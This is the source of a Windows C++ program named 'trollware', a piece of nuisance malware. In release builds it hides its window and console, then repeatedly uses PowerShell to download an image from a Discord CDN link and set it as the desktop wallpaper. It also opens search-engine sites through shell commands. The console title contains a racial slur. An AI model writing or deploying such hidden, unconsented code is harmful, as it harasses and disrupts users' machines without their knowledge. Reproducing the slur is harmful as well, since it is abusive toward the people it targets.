// trollware.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <chrono>
#include <shlobj.h>

#ifdef _DEBUG
int trollInterval = 10;
#elif NDEBUG
int trollInterval = 60;
#endif

LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

std::chrono::steady_clock::duration initDuration = std::chrono::steady_clock::duration(0);
std::chrono::steady_clock::duration elapsedDuration = std::chrono::steady_clock::duration(0);
std::chrono::steady_clock::duration deltaDuration = std::chrono::steady_clock::duration(0);
float elapsedTime = 1.0f;
float deltaTime = 0.0f;

BOOL WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    HWND hwnd;
    WNDCLASSEX wc;
    ZeroMemory(&wc, sizeof(WNDCLASSEX));

    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_NO);
    wc.lpszClassName = L"TrollwareWC";

    // register the window class
    RegisterClassEx(&wc);

    const RECT wr = { 0, 0, 0, 0 };

    // create the window and use the result as the handle
    hwnd = CreateWindowExW(NULL,
        wc.lpszClassName,    // name of the window class
        L"Trollware",   // title of the window
        WS_OVERLAPPEDWINDOW,    // window style
        300,    // x-position of the window
        300,    // y-position of the window
        wr.right - wr.left,    // width of the window
        wr.bottom - wr.top,    // height of the window
        NULL,    // we have no parent window, NULL
        NULL,    // we aren't using menus, NULL
        hInstance,    // application handle
        NULL);    // used with multiple windows, NULL

    ShowWindow(hwnd, SW_HIDE);
#ifdef _DEBUG
    ShowWindow(hwnd, SW_SHOW);
#endif

    AllocConsole();
    SetConsoleTitleW(L"Get trolled negga");
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);

printf("QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\n");
printf("QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~\"\"??9VWQQQQQQQQQQQQQQQQQQQ\n");
printf("QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\"?9$QQQQQQQQQQQQQQ\n");
printf("QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ\n");
printf("QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ\n");
printf("QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ\n");
printf("QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ\n");
printf("QQQQQQQP'.yQQQQQQQQQQQP\"       <wa,.!4WQQQQQQQWdWP??!\"??4WWQQQWQQc ?QWQQQQQ\n");
printf("QQQQQP'_a.<aamQQQW!<yF \"!` ..  \"??$Qa \"WQQQWTVP'    \"??' =QQmWWV?46/ ?QQQQQ\n");
printf("QQQP'sdyWQP?!`.-\"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ\n");
printf("QQ[ j@mQP'adQQP4ga, -????\" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?\"`  -?QzQ7L ]QQQ\n");
printf("QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc \"4QQQQa   .QP4QQQQfWkl jQQQ\n");
printf("QE ]QkQk $D?`  waa \"?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`\"QQQD\Qf(.QWQQ\n");
printf("QQ,-Qm4Q/-QmQ6 \"WWQma/  \"??QQQQQQL 4W\"- -?$QQQQWP`s,awT$QQQ@  \"QW@?$:.yQQQQ\n");
printf("QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ\n");
printf("QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  \"????9VWaamQWV???\"  a j/  ]QQf jQQQQQQ\n");
printf("QQQQQQw,\"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ\n");
printf("QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ\n");
printf("QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ\n");
printf("QQQQQQQQQQ,\"$WQQWQQQQg,.\"?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ\n");
printf("QQQQQQQQQWQa ?$WQQWQQQQQa,.\"?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ\n");
printf("QQQQQQQQQQWWma \"9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ\n");
printf("QQQQQQQQQQQQQQQws \"Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ\n");
printf("QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ\n");
printf("QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ\n");
printf("QQQQQQQQQQQQQQQQQQQQQQWWQQga,-\"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ\n");
printf("QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW\n");
printf("QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ\n");
printf("QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^\"!???????!^`_saQWWQQQQQQQ\n");

    
#ifdef NDEBUG
    FreeConsole();
#endif
    const auto initDuration = std::chrono::high_resolution_clock::now().time_since_epoch();
    auto old = initDuration;
    
    static char deskPath[MAX_PATH + 1];
    const bool hasDeskPath = SHGetSpecialFolderPathA(HWND_DESKTOP, deskPath, CSIDL_DESKTOP, FALSE);


    MSG msg;
    while (true)
    {

        auto now = std::chrono::high_resolution_clock::now().time_since_epoch();
        deltaDuration = (now - old);
        elapsedDuration = (now - initDuration);
        old = now;

        auto deltaTime = (float)std::chrono::duration_cast<std::chrono::microseconds>(deltaDuration).count() / 1000 / 1000;
        elapsedTime += deltaTime;

#define ms2s 1000

        int troll = (int)(elapsedTime);

        static int trollCounter = 0;
        constexpr const char* trollCmdList[] = {
            "start https://google.dk",
            "start https://youtube.dk",
            "start https://bing.dk",
            "start https://yahoo.dk"
        };

        constexpr const char* trollUrlList[] = {
            "https://cdn.discordapp.com/attachments/456024279822106644/1161928995705729086/2Q.png"
        };

        constexpr int trollCmdCount = sizeof(trollCmdList) / sizeof(char*);
        constexpr int trollUrlCount = sizeof(trollUrlList) / sizeof(char*);
        
        static bool didTroll = false;
        if (troll%trollInterval == 0) {
            if (didTroll == false) {
                didTroll = true;

                static const std::string backgroundPathA = std::string(deskPath) + "\\troll.png";
                static const std::wstring backgroundPathW = std::wstring(backgroundPathA.begin(), backgroundPathA.end());

                std::string downloadCommand = "powershell Invoke-WebRequest -Uri \"";
                downloadCommand = downloadCommand + trollUrlList[trollCounter % trollUrlCount] + "\" -OutFile \"" + backgroundPathA.c_str() + "\"";
                system(downloadCommand.c_str());


                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)backgroundPathW.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                system(trollCmdList[trollCounter % trollCmdCount]);

                trollCounter += 1;
            }
        }
        else {
            didTroll = false;
        }

        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);

            if (msg.message == WM_QUIT)
                break;
        }

#ifdef _DEBUG
        static bool state = false;
        if (GetAsyncKeyState(VK_UP) & 0x0001) {
            ShowWindow(hwnd, state == true ? SW_HIDE : SW_SHOW);
            state = !state;
        }
#endif
    }
}

// this is the main message handler for the program
LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message) {
        // this message is read when the window is closed
    case WM_DESTROY:
        // close the application entirely
        PostQuitMessage(0);
        return 0;
        break;
    }
    // Handle any messages the switch statement didn't
    return DefWindowProc(hWnd, message, wParam, lParam);
}
